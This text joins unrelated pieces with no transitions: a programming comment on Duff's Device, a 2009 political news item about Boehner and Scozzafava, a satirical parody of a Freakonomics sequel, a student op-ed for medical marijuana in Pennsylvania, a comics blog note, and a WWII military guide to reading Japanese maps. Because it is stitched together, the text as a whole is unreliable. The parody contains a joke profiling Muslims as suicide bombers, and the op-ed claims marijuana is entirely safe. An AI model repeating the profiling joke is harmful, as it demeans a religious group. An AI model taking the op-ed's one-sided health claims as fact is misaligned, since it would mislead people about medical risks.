The problem is if you ’re using an optimizing compiler ; the unrolled loop interior is n’t a basic block with Duff ’s Device , so the compiler can’t optimize it aggressively –all those internal branch targets prevent it from doing anything more clever than just four copies of the loop .
( You ca n’t see that in this case because there is n’t much more clever stuff for it to do . )
So all you save is the branch overhead , you do n’t save potential other savings .
Whether you should use a hand - unrolled loop ( and a separate cleanup with a switch ( ) or loop ) is a separate issue .
admin 2009-10-28 21:22:55
Tomasz : that ’s true and that ’s also why I deliberately made the test so that it ca n’t use movsd ( as loop operation does n’t have to map that easily to assembly instruction in all cases ) .

Boehner regrets Scozzafava support
House Minority Leader John Boehner ( R - Ohio ) said today he regrets backing former GOP candidate Dede Scozzafava for New York 's 23rd district race .
" This lady clearly has an agenda that 's different than most Republicans , " Boehner said of Scozzafava , who dropped out of the race Saturday .
" She was out there promoting herself and we 're doing everything we can to help Doug Hoffman in this race and we hope he wins . "

Boehner 's support of Scozzafava was a gamble .
He donated $ 5,000 to her campaign and threw his weight behind her when some conservative Republicans considered her too liberal for the GOP .
" She 'd fit in just fine , " Boehner said in early October .
" I 've contributed to her election , and we 're urging all of our members to help bring this race home . "
But if Hoffman wins tomorrow night , Boehner and Republicans say they 'll gladly accept him into the GOP conference .

At a rally for cheaper education .
A chant starts up :
“ The students !
united ! will never be defeated ! ”
My first thought : Wait , is that true ?
No , that ’s not remotely true .
You could easily get all the students together and have the rest of society crush them with impunity .
My second thought :
In fact , does n’t that drain all significance from the original chant , ‘ the workers , united , will never be defeated ’?
The significance being , that it ’s actually true , and that disunity and disorganisation of the working class is a necessary condition for capitalism .
But now apparently any group with a cause to push is happy to declare itself the invincible revolutionary agent .
* sigh *…
Some decisions are very easy .

But some are very hard .

As you can see , the reason it 's taken us four years to come up with a second volume is that we have n't really got any interesting material .
But as Chicago - based economist Kevin J Dickhead has proved , most readers do n't get beyond page 10 of books like this , so we 're not too bothered .
Let 's stir things up a bit .
It 's often said that women experience a glass ceiling .
Well , maybe the reason they earn less is because they are a bit workshy and like having babies .

Oi , Mrs Levitt and Mrs Dubner !
You can get on with the dinner now !
Does it seem odd that so many top sports stars are born at the same time of year ?
Almost certainly not , because Malcolm Gladwell already covered this in Outliers earlier this year and it was n't interesting then , as it was just a spin on educational year cohorts that most people already know .
But here 's the twist : a study by Captain Nemo from the Nautilus Institute shows that 99.9 % of all readers wo n't remember where they read it first , so we can claim this factoid as our own .
Many people fear Islamic terrorists .
In fact you are more likely to die of boredom reading this book than in a suicide bombing .
Still , there 's an infallible way to spot a suicide bomber : just check out everyone with a Muslim name who has no life insurance .
Or now that our secret is out , find every Muslim who has changed his name to Jeremy and bought life insurance .
Why did n't the CIA think of this ?
We 've called this next chapter Unbelievable Stories About Altruism And Apathy , because it turns out that everything we always imagined about people 's behaviour is n't as we thought because people react differently in experiments .
What 's really unbelievable is that it took until 2002 for Jim Dim of the University of Little Rock to point out that the Observer Effect , which has been known for decades by academics in the physical sciences , also applies in economics .
But as we 're economists we 're too thick to grasp this .
Did you know that it took a maverick doctor to point out that puerperal fever was caused by other doctors not washing their hands ?
Oh you did .
Well , anyway , some global problems can easily be solved , but people reject the solutions because they appear too cheap and easy .
Take hurricanes .
They are caused by a slight rise in the surface temperature of the sea in key locations .

But for some reason no one wants to listen to him .
Climate change is an extremely contentious issue , so , sure enough , we 're going to take an unorthodox line .
Al Gore is a tosser , global warming is not as bad as anyone feared , we need more not less carbon dioxide , and the only spanner in the works is that we 're not pumping enough sulphur dioxide into the atmosphere .
Our new best friends at the Centre for Burnt - Out Microsoft Trillionaires have proved that all we need to do is build an 18 - mile - high chimney on top of a coal power station and the planet can be saved .
It 's not as difficult as you think .
If you take a lot of drugs .
Finally , we would like to point out that economics is not just a human endeavour .
Professor Allen Lane bet us a bunch of bananas that a couple of monkeys could n't bash out this manuscript .
We sure proved him wrong !

" Marijuana , in its natural form , is one of the safest therapeutically active substances known to man . "
-- Judge Francis Young
BY REUBEN MITRANI
In 1988 , Judge Francis Young , former chief administrative law judge at the U.S. Drug Enforcement Administration , ruled in favor of the National Organization for the Reform of Marijuana Laws in its case for the legalization of medical marijuana .
Young was swayed by the fact that while it is possible to die from such legal medicines as ibuprofen , acetaminophen and even cough syrup , marijuana is entirely safe .
There has never been a death attributed to an overdose of marijuana .
If Young had his way , marijuana would be a Schedule II controlled substance , illegal for recreational use , but an acceptable prescription medicine .
Unfortunately , the case was then forwarded to John C. Lawn , then head of the Drug Enforcement Administration .
He swiftly overturned Young ’s decision and the case was closed on the federal level .
The decision was thus shifted to each individual state .
California was the first to make medical marijuana available , and they have been quite successful in doing so ; medical marijuana sales alone generate taxes of $ 220 million in the state .
Twelve other states have followed in California ’s path .
Some state governments —
New Mexico was the first — have even chosen to grow the plant , cannabis sativa , as a way to regulate its distribution .
Pennsylvania is not yet a medical marijuana state .
This needs to change .
House Bill 1393 , the Compassionate Use of Medical Marijuana Act , attempts to do just that .
Under the bill , marijuana would become legal in medicinal cases .
This bill needs to pass and the sooner the better .
Critics of medical marijuana often say that the substance is dangerous and leads to harder drugs , is highly addictive and habit forming , is detrimental to health and causes cancer , and that it is not a proven medicine .
These are all false statements .
Institute of Medicine reports have shown that marijuana does not lead to harder drug use .
Early use of alcohol and nicotine leads to harder drugs more often than marijuana does .
The only proven connection between marijuana and hard drug use is the fact that most users are introduced to drug dealers through marijuana .
Legalizing medical marijuana would even help to reduce this connection , as it would partially sever the ties between marijuana and drug dealers by making the plant a regulated prescription drug .
The only way to fully sever the ties to drug dealers would be to make marijuana completely legal , but that is a different argument .
Marijuana is not an addictive substance , with only 9 percent of users developing a habit .
In comparison , 17 percent of all alcohol users develop dependence to the substance .
Marijuana addiction also pales in comparison to most legal pharmaceuticals .
Yes , smoking marijuana is harmful to the lungs , but it is nowhere near as harmful as tobacco smoke .
This is because a marijuana user smokes in far smaller amounts than a tobacco user .
Some scientists have indicated that while marijuana has medical uses , they cannot recommend it until there is a smokeless way of using it .
The issue is that marijuana contains at least 400 other compounds , so to deliver just THC — marijuana ’s most active compound — as the pill Marinol does , does not provide the entire positive effect of marijuana .
This means that smoking is the only way to use marijuana then , right ?
Wrong .
Many Los Angeles area medical marijuana dispensaries serve marijuana brownies , shakes , cookies and other pastries .
They even sell butter with which patients can cook .
These are all safe , nonsmoking ways of delivering marijuana ’s benefits .
While smoking is ultimately the most effective way to deliver the effects , if the patient so desires , marijuana can be dispensed in many other ways .
This leaves the supposed lack of medical benefits as the remaining roadblock between Pennsylvania and legal medical marijuana .
Marijuana has been proven to be beneficial to patients with a wide variety of ailments .
The Institute of Medicine concluded that for patients with HIV / AIDS , marijuana provides relief in a myriad of areas that no other one substance can .
It helps as an appetite booster , an anti-depressant and a pain - reliever , and it fights nausea .
In cancer patients it can significantly reduce the negative effects of chemotherapy such as nausea .
Many multiple sclerosis patients use marijuana successfully to get relief from spasticity , nerve pain , tremors , sleeping disorders and depression .
In addition , it also helps with chronic pain relief in all cases , and recent research has shown that it may have tumor - reducing and anti-carcinogenic properties .
These are just a few of marijuana ’s benefits .
Pennsylvania has denied its citizens a fundamental right , the right to treat their maladies with a safe medication , for far too long .
Thirteen of our 50 states have acknowledged marijuana 's medicinal benefits so far , and President Obama declared that the federal government will now respect states ' rights on this issue .
So , Pennsylvania lawmakers , the ball — HB 1393 — is in your court .
Let 's make it happen .
REUBEN MITRANI is a Patriot - News Davenport Fellow and senior at the Harrisburg Academy .
Today , I had the fun opportunity to teach comics at the Hammer Museum in Los Angeles : I mention it only because it was my last appearance for 2009 .

I 'm mindful , every day , of how blessed I am to have a job like this .
It 's a rare and wonderful thing .
But one of the best parts of the job is getting to meet you in places like Miami , Seattle , San Diego , Virginia , Massachusetts , and Baltimore .

READING A JAPANESE MAP
A map is taken from the body of a dead Japanese officer -- what does it represent ?
The ability to read and interpret such a map on the spot may mean the difference between victory and defeat .
a. General
In many ways , Japanese maps , although generally similar to our own are puzzling .
The symbols upon them frequently resemble ours , but often are strange , and again , familiar but having a different meaning from ours .
A broad - leafed tree , for example , is represented by in both systems , but -- suggestive of an apple hanging on a branch -- means an orchard tree ( or " private soldier " ) ; is a spring , a foundry and a statue ; elongate the zero into capital O , and " statue " becomes " isolated tree . "
The symbol for a road ( more than three meters wide ) is two parallel lines but if the lower line is broken it discloses that significant military detail , " Road impassable to carts , " and , " Road under construction " differs from an 18 - foot country road .
The Japanese symbol for a railroad rather suggests a canal .
The military symbols are even more confusing , as they seem to be a badly digested combination of the American and German systems -- for example , an observation post in German is ; in Japanese , a battalion OP is ; an AT gun in German is ; a Japanese rapid fire gun .
Occasionally , a few curious figures are found , as in a photostat of an ex-British area marked with a symbol , apparently meaning " airport " , although the character suggests a rapid - fire gun or a battalion OP , and the usual airport symbol is .
Later in this article , military symbols will be discussed in more detail .
In view of these differences , it is believed worth while to examine Japanese maps and both their topographical and military symbols with a view of presenting in a condensed form enough information to enable a combat officer with little time or energy for detailed study to grasp the essentials of any Japanese map that would be likely to fall into his hands .
Much has been deliberately omitted -- the symbols for fences , for example , are limited to those having military significance -- stone walls that provide bullet - proof protection and bamboo fences and " living tree " hedges that may either give cover or hide the terrain beyond .
Hereafter is shown a number of the more frequent Japanese terrain symbols .
Several types of terrain are illustrated by cuttings from un-retouched maps such as figure 1 , which shows an urban area , part of Kyoto sheet , and figure 2 cut from another part of the sheet are flat rice - lands .
Ordinary countryside and mountainous areas are mapped in figures 3 and 4 .
On page 43 is a selection of military symbols , and figures 5 , 5A , and 6 are examples of actual Japanese combat maps from Attu and Guadalcanal , reproduced as faithfully as possible .
Many Japanese maps are printed in an eye - straining small type .
When working with a Japanese map , even in a good light , a 4 - inch magnifying glass is extremely useful .
For the benefit of American readers , the printed maps here illustrated are enlarged to almost twice their original size .
It will be noted that these maps show an extraordinary amount of detail -- far too much to try to memorize .
Symbols might be found that represent a prefectural office , district ( gun , pronounced " goon " ) , municipal , village , MP , police , revenue , monopoly and meteorological offices ; a factory , foundry , granary , lime kiln , lumber yard , metal works , powder magazine , store house , temples of various faiths and an " orthodoxy bell tower " -- whatever that may be .
Practically anything anyone might wish to locate is shown , except a comfort station .
Occasionally symbols are thrown in which may be obvious to a Japanese but not to a westerner , without the usual careful explanation -- in Japanese script -- on the margin .
Finally , symbols may vary with the scale of the map , with one set for a 1 to 50,000 and another for 1 to 200,000 .
Only the more useful symbols are therefore included .
COMMON JAPANESE MAP SYMBOLS
* From figure 6 , Guadalcanal
* It is frequently very difficult to distinguish between a badly printed " masonry wall " symbol and a " wooden fence . "
The " wall " is apt to have white spaces .
** Inverted picks indicate abandoned mine .
*** Frequently looks like simple cross lines .
b. Japanese Topographical Maps
(1) General Observations
Japanese official topographical maps are published on standard scales 1 to 10,000 , 1 to 20,000 , 1 to 50,000 , and so on .
As the 1 to 50,000 is the most usual , and employs the standard symbols , parts of maps in this scale are here reproduced for illustration .
Sometimes the scale will be stated at the bottom as a fraction in Arabic numerals , sometimes not .
However , there is a distance scale at the bottom of the sheet in meters and ri , the Japanese " statute mile , " actually a one - hour walk , or league , of approximately 2.5 U.S. miles .
The meter scale is recognizable by its marking in thousands , and by the Japanese character at the left , which in small print is apt to look like an asterisk .
The meter - scale is apt to be on top , the ri - scale below .
From the meter scale , the mathematical scale of the map may be quickly calculated by the following method : A meter is approximately 39 inches .
Therefore , measure off from the metric scale a convenient number of thousand - meter units to correspond with the inch - scale of the ruler , multiply the thousand - meter units so measured by 39,000 and divide by the number of inches spanned .
For example , in the scale below as shown on a Japanese map , the total length of the metric scale , including the fraction - scale , to the left of zero , is four inches ; therefore 5,000 meters equals 4 inches ; 1,000 meters equals 39,000 inches ; 39 x 5,000 = 195,000 ; divided by 4 the result is 48,750 , or approximately 50,000 ; hence , the scale is 1 to 50,000 .
Somewhere , the contours will be marked in Arabic numerals -- a typical example , the sheet used in figure 4 , has the 100 - meter contours in heavy lines , and intermediate unnumbered lighter lines representing 120 , 140 , 160 and 180 - meter contours are printed in finer lines .
As to symbols , on the left there may be a column of symbols which is frequently helpful although explained in Japanese .
However , as will be noted in the following discussion of the map of Kyoto , occasional unexplained symbols occur .
(2) Map of a City
Figure 1 represents the NE portion of the city of Kyoto , situated on the largest Japanese island , Honshu , southwest of Tokyo , and about 25 miles north of the important port of Osaka .
Three miles northeastward lies the beautiful lake of Biwa ( Biwa Ko ) from which Kyoto draws water through a gravity tunnel large enough to accommodate market boats .
The city was the ancient capital of Japan and has many historic shrines and temples .
Today it is one of the centers of silk , embroidery , weaving , porcelain and lacquer industries which ten years ago supported a population of over a million .
Upon the map , a reference grid has been drawn , the lines lettered from north to south and numbered from west to east .
It may be read quite simply , down and to the right .
Distances south of lettered lines are indicated by numbers .
For instance , the bath - tub - shaped symbol of the prefectural office is at E.8 , 1.9 .
A question may be raised as to why a city is included in such an article as this , but plenty of fighting has occurred in cities , and it may be convenient to be able to recognize and direct gun-fire quickly on such strategic points as telephone exchanges or power sub-stations .
[ click to enlarge ]
Following the double - track ( electric ) railroad , possibly of 4 foot 8 1/2 inches European gauge , that enters the grid from the northeast , it will be seen that the right - of - way crosses two 18 - foot roads , one of which leads to a local station .
Westward , at A.9 , 6.2 will be seen the single dark line of a three - foot , push - cart path , which joins the road just west of the depot and , running SW parallel to the tracks , till , as it crosses a small branch of the Biwa Lake Canal it connects with another 18 - foot road .
This branch canal enters the map at D.6 , 7.0 and circles northwest to A.1 , 4.3 thence southwestward to B. 8 , 1.3 .
In its course , it apparently passes under the small stream at A.7 , 5.5 in a siphon or over it on an aqueduct -- it is difficult to say .
At B.1 , 2.9 and further on , siphons or culverts are also indicated .
Returning to the railroad , and 18 - foot road at B.4 , 6.1 , the road winds eastward , crossing the double tracks apparently on grade .
South of the road are dry - rice - field symbols and a small embankment .
The railroad proceeds southwest to another station , north of which at B.9 , 5.2 , is the cog -wheel symbol of a factory .
The light shading of the houses indicates light construction , heavier shading , heavier construction , not population density .
At C.7 , 4.5 will be seen the thin capital X of a police station .
Just east of the terminal is the swastika symbol of a Buddhist temple .
South of the terminal at E.0 , 4.6 will be seen the circle of some sort of a local city office , and SW of the office at E.4 , 4.3 , the " little boy " symbol that indicates a school .
Near the terminal there should be a post office , and one will be found at E.8 , 5.6 with the line - and - T - in - a - circle symbol indicating that there is telephone and telegraph service as well .
A telegraph - and - post office will be found at H.6 , 1.9 next to a school .
No example of the " envelope " symbol has been found .
The " city hall " ( inner and outer rings ) will be found at G.4 , 3.6 and at H.6 , 1.4 west of a school , may be made out the star representing " regimental & defense Hq. , " perhaps an armory .
There are several items of interest in the E , F , 6 , 7 quadrangle , including an obvious triangulation station numbered 102.6 or 102.6 meters elevation , a Shinto " heavenly gate " shrine - symbol just above it , the three - tined - pitchfork symbol of an imperial tomb just south of " 0 " in 102.6 .
At E.9 , 6.8 is a small black square symbol for which no interpretation is known .
In the quadrangle below is another odd symbol , like a carpet tack , point up , in an inverted U which may be a grave monument ( the tack ) in an enclosure , the inverted U .
At the northwest corner of the grid , a high - tension power line enters the city , terminating at a power - house ( converter ? ) in a rice field .
( In the diagonally opposite corner of the grid at G.8 , 6.4 is another powerhouse ) .
Four quadrangles south , at E.2 , 1.2 , in the middle of a city block un - built on the north , the telephone symbol , somewhat like a desk - set , may be found -- probably an exchange .
At F - 1 , 1.6 is a Y - shaped symbol of unknown meaning .
An isolation hospital can be identified at A.8 on line 5 .
If the top line were double , the shield - and - cross symbol would indicate a general hospital .
In the center of the city is an imperial palace -- the building not shown , perhaps for religious reasons -- two large , walled enclosures , set among groves ( the " bird - in - flight " symbols ) and the whole park surrounded by a tree - crowned embankment or a moat -- it is difficult to tell which .
There is a temple - lantern ( small circle - with - four - arms ) at E.5 , 3.5 .
In the street half way between F and G , a streetcar line with station , runs east and west .
Careful inspection of the map shows no iron - cross ( or crossed dumb - bell ) symbol of a jail .
The toy - Christmas - tree symbol of a court of appeals may be found at F.6 , 3.2 , south of the car line .
There is no symbol for a fire - engine house , although some of the circles might house fire fighting equipment .
The circle surmounted by three small vertical lines in the south - west corner of the large park F.2 , 2.5 , is interpreted as " government office , domestic . "
A tiny statue - symbol may be picked out at F.8 , 4.5 , just diagonally south - west of the cogwheel factory symbol .
West of the statue is the diamond - shaped symbol of a tax office .
Clearly marked at F.2 , 3.6 , east of the park is the cross of a church , and what seem to be two others — missions perhaps -- may be seen faintly at F.4. 1.1 , just above the street car station .
Resembling a sheaf of wheat , the symbol for a bank may be found at 2.9 just above the H line .
Across the small brook that runs out of the grid at A.0 , 2.4 , may be seen two bridge symbols , one at A.7 , 2.7 of a type not explained in the margin , but from its heavy inking , probably of masonry ; the other , at B.8 , 3.2 might be masonry or steel , as the characters for masonry and steel bridges are almost identical .
At the bottom of the map at H.6 , 5.1 will be seen a small Buddhist temple with several out - buildings , perhaps shrines , facing the street and car - line , enclosed on the north and east by a masonry wall ; and , on the top of the cut bank on the south side , an embankment planted with a hedge of trees -- much useful information packed in a very small space .
The Japanese cartographer is thorough .
An examination was made of a map of the harbor - front area of Yokohama to determine whether a figure of such an industrial and shipping section should be included .
Practically nothing was discovered of military value not discussed elsewhere .
(3) Flat Country - Side
In figures 2 and 3 , are shown two fairly representative types of countryside -- 2 , flat rice lands bordering on the lake , Biwa Ko , near Kyoto , and a small coastal village , 3 , with an anchorage and hills behind .
Figure 2 presents a very tricky problem in map reading that will make an expert look twice -- the problem of the difference between a dike and a dry stream .
Pick up the double - track railroad on line G at 1.5 and follow it north - east over an 18 foot road , through rice fields dotted with pine trees to the westward , and crossed by a three - foot cart track on a small embankment .
At F.2 , 1.5 will be seen a small family burial plot with a marker .
The railroad now crosses another push - cart track , which to the westward , follows the line of a small drainage ditch .
Crossing a highway and an 18 - foot country road , the line disappears under what appears at first glance to be a stream bed .
The faint parallel marks of a tunnel do show up under a glass .
The embankment may be recognized by the tiny arrow - head - shaped dots pointing outward , and by a road on top .
There is , however , another line of faint dots north of the road symbol , and further on , on what might be mis-read as the opposite bank of the " stream " is another double row of dots .
The correct reading is an embankment , with two ridges on each side of it , perhaps the elevated , dry bed of an old canal , but in any event , a military obstacle providing defilade , a protected parapet , and an excellent place to dig in machine guns or AT weapons .

In the village that is strung out along the highway paralleling the railroad , may be noted the - a postal - telephone - telegraph office , a village office , and between them a Buddhist temple .
Next the town hall is a survey marker showing 96.77 meters elevation , and just above the " 6 " , a police station .
East of the police station is an oval suggesting a sub-prefectural office .
North of that is a Shinto shrine , and beyond the shrine , a recognizable chimney with smoke coming out of it , attached to a good - sized building of very light construction -- perhaps some sort of a drying shed .
In the fields at D.4 , 5.2 is an " isolation hospital " -- here probably not isolation but a small local hospital perhaps of a few rooms for lepers or insane patients -- and just above it the half - a - cog - wheel symbol of a small watermill .
The presence of the water mill -- possibly a " fileature " for reeling silk and the shed - and - chimney suggests that the latter may be a building in which cocoons are kept .
High and low - tension power lines may be noted east of the railroad , distinguished by the two dots , sometimes looking like a cross-bar of the high tension line .
Numerous drainage ditches and small , diked - in ponds without any outlet would suggest very flat land and a high water - table , which is in fact the case as the lake is a very short distance off the map to the west .
One feature on the map is the presence of vegetable gardens , indicated by shading at B.1 , 5.0 or B.2 , 7.0 .
These gardens are apt to be surrounded with fences or trees and provide cover for snipers .
At line B.0 , 5.0 the railroad crosses another double embankment , and beyond , before it reaches the railway , a fill is indicated by the outward - pointing dashes .
It is not high .
If it were , the height would be marked as at F.8 , 1.7 , and again on the embankment at E.3 , 6.0 , where the figure " 9.1 " ( meters ? ) appears .
A curious symbol looking like single and double road - barriers can be seen at the road fork , B.8 , 8.3 and others occur at the northern and eastern exits of the village at C.8 , 3.7 .
These do not fit any Japanese symbol shown on the symbol list printed on the map sheet , and are believed to be some indication of road width , tentatively , six and twelve meters .
Another unknown very small symbol , perhaps a tiny , circular pond , can be seen at the right of the road " barrier " at C.6 , 3.9 .
At D.2 , 4.8 can be seen two symbols that appear to be mounds , perhaps ancient burial mounds .
This may well be as the area has been settled for thousands of years .
Inside the pencil circle at F.6 , 3.4 may be seen dots suggestive of the tea-symbol , three dots in a triangular pattern .
Tea " gardens " however , are apt to be planted on hills .
None has been identified on this map , nor the tiny " K " symbol of mulberry trees .
The zig - zag dot - and - dash lines such as may be found at C.8 , 1.3 are village boundaries .
(4) Hilly Country - Side
Turning to the hill - country area , figure 3 , we find an attractive seaside village near Kaimondake ( Mt. Kaimon ) at almost the southern tip of Kyushu , one of the main islands of Japan proper .
A small anchorage is indicated in the bay by an incomplete anchor .
Inland , the pine - covered hills rise sharply to the 1,200 foot saddle - back west of the lake , which is marked as having an elevation of 126 meters .
It must be a picturesque country , as just off the map about four miles rises the almost perfectly symetrical , 3,000 - foot peak of Mt. Kaimon , evidently an extinct volcano of the circular , pointed " Fuji " type .
Along the water - front may be noted , reading around to the left from the point , on line E at 7.7 , a small - boat ferry , indicated by a figure of a boat ; a rocky shore , the post office , and an improved highway following the shore line to the road fork leading inland .
Here , at the shore line , may be noted two oddly - shaped symbols like three flowers in a bowl , indicating mineral springs .
There is another north - east of the lake .
Just west of the second spring , at D.1 , 6.6 will be found the terminus of a 3.5 - foot gauge railroad ( standard for Japan ) , under construction -- two parallel lines joined at intervals by bars , Just above the spring is a small tunnel , with another a short distance further on , before the railroad crosses the highway on a bridge .
A path continues from the turn of the road along the shore .
[ click to enlarge ]
Following west from the bay on the road running inland , a hospital can be noted to the south , before the second settlement is reached .
This is apparently not an organized village , as it lacks a post - office , village hall , or any sort of temple or school -- which is quite unusual .
The settlement clusters around the building marked with the horizontally - divided - diamond sign listed in TM 30 - 480 , p. 281 as a " monopoly bureau factory " -- perhaps tobacco -- although no example of this symbol has been observed on the Japanese symbol sheets studied in the preparation of this article .
South of the road opposite the police station is a rice field , the double upright marks on a base being a variation of the usual parallel - line rice symbol -- certainly one of the characters one would expect to find entirely standardized .
There is nothing noteworthy in the second village .
Following any path uphill to the northward , it may be noted that the 300 and 200 meter contours are marked , but not the 100 , with the intermediate contours lightly printed .
The odd little three - line symbol means " waste land . "
At " 300 " , between C and D in the 1 column is a well - marked cliff or escarpment .
Along the steep bluff that surrounds the little lake may be seen broad - leaf tree symbols and a few K - shaped mulberry trees .
It is to be noted that no Buddhist shrines appear on this map or in the general area .
There seems to be a tendency for the townspeople to be Buddhist , and the old - fashioned country people to cling to the ancestor - worship of the Shinto faith .
(5) Mountain Terrain
Figure 4 shows a more mountainous section of the same general area .
As many of the Japanese mountain maps are a monotonous tangle of contours with little detail of interest , an area south and west of figure 3 was selected to illustrate the Japanese portrayal of mountain topography .
[ click to enlarge ]
Beginning with the tip top of Mt. Kaimon in the extreme south - west corner , an odd symbol is immediately encountered -- the downward - pointing line starting from the circle just below the survey bench - mark , 924.0 .
Obviously it must be a flagpole , statue , or marker -- but it is not .
Two inconsistencies are to be noted -- one , that the bench - mark , which should represent the highest point is not in the circle , or obvious top - contour ; second , that the line points downward from the circle ; and finally , a detail revealed in the original map only by a glass , the line is actually an arrow , with its head inside the circle .
The fact of the matter is , that the circle represents a tiny hollow , probably the remains of the old crater , and the arrow is used to call attention to it .
This data is explained in an appropriate marginal note on the original , but an arrow - circle is apt anywhere to mean a depression .
The arrow at C.8 , 3.9 , however , merely connects the Japanese lettering above , beginning with the cross in the square , which is a place - name .
Another unusual item may be noted in four types of contour lines -- " numbered , " " measured intermediate , " " intermediate , " and " helping . "
The first two are obvious ; the intermediate , with broken contours may be seen just south of " 120 " at E.8 , 1.2 , and " helping " at C.7 , 2.5 where an " intermediate " contour fades into a " helping . "
Making it more complex , a practically identical faint dotted line apparently indicates some sort of an enclosure , as in the F , G , 2 , 3 quadrangle .
Vivid chasm symbols occur at H.8 , 3.4 and along the stream that runs south from F , between 5 and 6 , and an equally illustrative " crumbling cliff " at B.6 , 1.7 .
At the same point an operating mine is indicated by the crossed miners ' picks , upright .
If reversed , the mine would be closed .
The shaded circle indicates silver -- an open circle would be gold .
( Gold mines occur a few miles further north , off the map . )
It must be a small mine , since no improved road goes near it nor does the high - tension power line which crosses the center of the map send in a feeder cable .
There are about thirty houses in the nearby camp giving some idea of the number of hands employed in the diggings .
Just east of the settlement , the small circles of different sizes without tree - trunk stems probably show a cut - over area suggestive of mine props .
At F.0 , 4.5 is a grove of mulberry trees , and a shallow , swampy pond appears at C.3 , 4.6 .
From the crest of the flat topped hill at D.2 , 6.2 , dotted lines expanding northeast probably indicate divisions between crops or types of vegetation .
Large slide - tracks are indicated by fine , straight lines cutting across the contours , not shown on these illustrations .
c. Military Maps
(1) General
Military maps , naturally , are far simpler than topographical sheets .
For example , the military railroad symbol is the same as our own rather than the complex civilian symbol .
This simplification is offset by a somewhat illogical and very complex set of military symbols -- see page 43 .
The following instructions to map makers has been highly condensed from a translation of " The Applied Tactics of the Japanese Army . "
* * *
( a) General Instructions
The title of the map is written on top ( from right to left ) and the date in smaller print underneath .
Lakes , ponds , streams and also the disposition of Japanese forces are colored blue , enemy dispositions in red .
The location of commanders is shown by the headquarters symbol .
The location of an artillery OP is not necessarily shown if close to the guns .
The position of the same units at different times is indicated , when necessary , by unshaded and shaded symbols .
[ It is thought that the shaded symbols indicate the last position occupied . ]
Road spaces and intervals of marching troops are drawn as far as possible to scale .
( b) Deployment
The disposition of outposts , the positions , and that of the reserves , to the patrols and sentry posts must be indicated in detail .
The outpost line of resistance must be indicated by a continuous line in blue .
( c) Defense
The direction of a counterattack ( on a hostile force ) is indicated by an arrow .
In the map of a defensive sector , the direction of the anticipated main hostile attack will be differentiated from subordinate attacks , and both types of anticipated attacks indicated by red arrows .
If main attacks are anticipated in two or more directions , both will be indicated , but the more important attack clearly specified .
(d) Deployment for Attack
In a meeting engagement , it is necessary to indicate clearly the line of battle , and whether the attack will be piecemeal or coordinated .
To indicate the enemy situation when attacking an organized position , the probable and actual situation will be shown .
The probable situation will be indicated as such .
( e) Artillery Positions and Preparation
Enemy lines and probable artillery positions will be shown , also the direction of both our own [ Japanese ] and hostile attacks , and our own front line .
Main fire direction zone will be shown ; position of all unit commanders , OP 's , ammunition trains , routes leading to forward positions , routes of advance and if necessary , means of concealment , positions of artillery observers and the communication net will be indicated .
When a change of position is anticipated , the route to be taken and the time will be indicated .
On maps showing artillery preparation , the type of gun , the number of batteries , and the area to be covered by fire will be indicated .
The preparatory fire prior to the infantry advance and that to be delivered thereafter will be indicated .
* * *
(2) Military Symbols
Military symbols are particularly confusing since they do not always follow a well - thought - out pattern as do our own , or the German .
A " unit , " for example , is ; an infantry unit , , but a field artillery unit is represented by the symbol for a gun whereas the expected symbol would be , a character which represents not an artillery unit , but a field artillery ammunition train .
The arrow generally associated with " machine gun , " when combined with the gun symbol into , means not machine - cannon , but long - range field gun .
These discrepancies could be multiplied indefinitely .
It must be clearly understood , and never forgotten , that to read Japanese symbols by combining them according to a reasonable and natural system may lead to highly erroneous , and even dangerous , conclusions .
A symbol must be either known , or if not known , interpreted with extreme caution .
Of over 300 symbols listed in " Applied Tactics of the Japanese Army , " some of those believed to be the more useful to a field officer are listed below , together with the abbreviations used on maps .
Like the symbols , they are at times illogical and confusing .
Common Japanese Military Symbols and Abbreviations
* The symbol is not " artillery unit , " but , " field artillery ammunition train . "
The symbol is irregular -- compare , " Tank am train , " below .
** Symbol shown on map of Shemya Island .
Abbreviations *
Abbreviations sometimes used instead of symbols are usually in English letters , but the Japanese are often careless in the matter of capitalization .
A Army , also field artillery AA Antiaircraft artillery and / or AA position B Brigade b Battalion biA Infantry battalion gun unit c Company , troop , battery D Division F
The enemy -- foe , foeman ( cf. Feind -- German ) Fc Air squadron ( Japanese , not enemy )
( F , in combination , loses its " enemy " significance ) FeA Heavy artillery FM Air unit G Imperial guards H Howitzer HA AA gun HMA AA machine cannon ( artillery ) HMG AA machine gun i Infantry iA Infantry gun unit iB Infantry brigade iH Infantry mortar iK Infantry cannon ( gun ) iR Infantry regiment K Cavalry ( cf. Kavallerie -- German ) LG Light machine gun -- ( cf. leicht -- German ) LM
Light trench mortar unit ( not light trench mortar ) M Mortar -- also ammunition section ( platoon )
also used as adjective " Medium . " ( cf. Mörser -- German ) MA Machine cannon unit MG
Machine gun unit MM
Medium trench mortar unit MW Grenade discharger , rifle ( cf. Minewerfer -- German ) P Engineers ( cf. Pioniere -- German ) PW Armored car unit R Regiment RiA Regimental gun unit RSt Regimental ammunition train S Independent -- see figure 7 , PS = Independent engineer units , in company areas 1 and 2 ; ( Note : S = " independent . "
Always follows unit abbrev . )
Also , march casualties collecting unit ; also , heavy ( cf. schwer -- German ) used as adjective -- see below .
SA Heavy ( U.S. medium ) field artillery Se Shipping , as in SeP , below SeP Shipping engineers regiment , see Tactical and Technical Trends , No. 43 p. 9 , Japanese Use of Military Barges par .
c. SM
Heavy trench mortar unit St Ammunition train TA Rapid - firing gun unit TAS Independent AT unit TK Tank unit -- also Tank TL Signal company , wire ( telephone or telegraph ) unit TP Mechanised unit Z Chemical warfare unit Zid Automatic gun unit
* Where interpretations or abbreviations differ from those in current TM's ( as in " LM " ) the former represent the most recent revisions .
Unit Designations
Roman numerals -- battalions
Arabic numerals -- other units
Note -- on figure 7 , will be found in the company areas -- the symbol with ( PS ) meaning of the unnumbered Independent Engineers , which is two squads out of the 16 squads of the unit .
As there are 16 squads in a company , the Independent Engineer unit was a company .
Example -- III 2i - 3d Battalion , 2d Infantry ; 18 P - 18th Engineers .
Note -- on figure 7 , will be found in the company areas -- the symbolwith ( PS ) meaningof the unnumbered Independent Engineers , which is two squads out of the 16 squads of the unit .
As there are 16 squads in a company , the Independent Engineer unit was a company .
(3) Two Examples of Japanese Combat Maps
Two examples of Japanese combat maps are shown in figures 5 and 6 , with interpretations in figure 5A , and ( c ) below .
The first represents a small island near Attu , the other a Japanese sketch of an American position on Guadalcanal .
( a) Shemya Island
In figures 5 and 5A are shown the map of an island believed to be Shemya , one of the several tiny Semichi Group which lies just east of Attu .
